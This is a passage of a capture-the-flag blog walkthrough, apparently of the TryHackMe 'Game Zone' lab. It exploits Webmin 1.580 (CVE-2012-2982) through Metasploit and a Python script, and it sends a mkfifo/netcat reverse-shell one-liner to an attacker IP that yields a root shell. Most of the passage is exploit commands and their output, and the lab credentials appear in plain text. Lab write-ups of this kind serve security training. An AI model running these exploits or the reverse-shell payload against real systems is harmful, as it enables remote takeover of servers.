+[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=[::1]:10000 state=error: record layer failure
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set ssl false
+[!] Changing the SSL option's value may require changing RPORT!
+ssl =&gt; false
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploiting target ::1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploit completed, but no session was created.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-44951" onclick="terminalOverlayClose('bash-bash-44951')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-44951')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-44951')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-44951')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-44951" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ msfconsole -q
+msf6 &gt; search webmin 1.580
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess
+
+msf6 &gt; use 
+Usage: use &lt;name|term|index&gt;
+
+Interact with a module by name or search term/index.
+If a module name is not found, it will be treated as a search term.
+An index from the previous search results can be selected if desired.
+
+Examples:
+  use exploit/windows/smb/ms17_010_eternalblue
+
+  use eternalblue
+  use &lt;name|index&gt;
+
+  search eternalblue
+  use &lt;name|index&gt;
+
+msf6 &gt; use exploit/unix/webapp/webmin_show_cgi_exec
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; show options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     10000            yes       The target port (TCP)
+   SSL       true             yes       Use SSL
+   USERNAME                   yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set rhosts localhost
+rhosts =&gt; localhost
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set USERNAME agent47
+USERNAME =&gt; agent47
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set PASSWORD videogamer124
+PASSWORD =&gt; videogamer124
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[-] Exploit failed: A payload has not been selected.
+[*] Exploiting target ::1
+[-] Exploit failed: A payload has not been selected.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload linux/x86/shell_reverse_tcp
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload linux/x86/shell/reverse_tcp
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/linux/http/x86/read_file
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/unix/reverse_perl
+payload =&gt; cmd/unix/reverse_perl
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploiting target ::1
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set lhost tun0
+lhost =&gt; tun0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set lhost tun0
+lhost =&gt; tun0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=127.0.0.1:10000 state=error: record layer failure
+[*] Exploiting target ::1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=[::1]:10000 state=error: record layer failure
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set ssl false
+[!] Changing the SSL option's value may require changing RPORT!
+ssl =&gt; false
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploiting target ::1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploit completed, but no session was created.
+</pre> </div> </div> <p><br> Start a netcat listener.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4144"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4144')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4144')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4144')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4144')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4144">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4144" onclick="terminalOverlayClose('bash-bash-4144')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4144')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4144')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4144')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4144" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> </div> <p><br> Use revshells to generate a payload.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Revshells" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.revshells.com/" rel="external nofollow noopener" target="_blank">https://www.revshells.com/</a></p> <p><br> Execute the python script.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4320"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4320')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4320')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4320')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4320')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4320">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ python3 CVE-2012-2982.py -t 127.0.0.1 -p 10000 -U agent47 -P videogamer124 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.4.119.29 443 &gt;/tmp/f'
+[+] targeting host 127.0.0.1 on port 10000
+[+] successfully logged in with user 'agent47' and pw 'videogamer124'
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4320" onclick="terminalOverlayClose('bash-bash-4320')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4320')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4320')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4320')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4320" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ python3 CVE-2012-2982.py -t 127.0.0.1 -p 10000 -U agent47 -P videogamer124 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.4.119.29 443 &gt;/tmp/f'
+[+] targeting host 127.0.0.1 on port 10000
+[+] successfully logged in with user 'agent47' and pw 'videogamer124'
+</pre> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4359"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4359')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4359')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4359')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4359')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4359">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.4.119.29] from (UNKNOWN) [10.10.190.117] 54152
+bash: cannot set terminal process group (1239): Inappropriate ioctl for device
+bash: no job control in this shell
+root@gamezone:/usr/share/webmin/file/#
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4359" onclick="terminalOverlayClose('bash-bash-4359')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4359')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4359')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4359')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4359" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nc -nlvp 443                         
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.4.119.29] from (UNKNOWN) [10.10.190.117] 54152
+bash: cannot set terminal process group (1239): Inappropriate ioctl for device
+bash: no job control in this shell
+root@gamezone:/usr/share/webmin/file/#
+</pre> </div> </div> <p><br> Get the root.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4806"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4806')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4806')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4806')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4806')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4806">
+root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
+cat /root/root.txt
+&lt;redacted&gt;
+root@gamezone:/usr/share/webmin/file/# ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:1e:8d:69:ac:fd brd ff:ff:ff:ff:ff:ff
+    inet 10.10.190.117/16 brd 10.10.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::1e:8dff:fe69:acfd/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4806" onclick="terminalOverlayClose('bash-bash-4806')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4806')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4806')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4806')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4806" data-language="bash">
+root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
+cat /root/root.txt
+&lt;redacted&gt;
+root@gamezone:/usr/share/webmin/file/# ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:1e:8d:69:ac:fd brd ff:ff:ff:ff:ff:ff
+    inet 10.10.190.117/16 brd 10.10.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::1e:8dff:fe69:acfd/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> </div> <p><br> And with that we smashed the game zone. Thanks for reading along. See you in the next one.</p> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
